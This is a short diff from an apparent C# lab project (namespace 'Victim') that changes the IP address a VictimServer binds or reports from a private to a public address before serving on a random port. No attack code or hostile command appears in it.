@@ -21,7 +21,7 @@ namespace Victim
             UdpClient uclient = new UdpClient(0);
             int random_port = ((IPEndPoint)uclient.Client.LocalEndPoint).Port;
             uclient.Close();
-            VictimServer vs = new VictimServer(random_port, pass, "192.168.43.164");
+            VictimServer vs = new VictimServer(random_port, pass, "132.72.232.83");
             vs.serve();
         }
     }
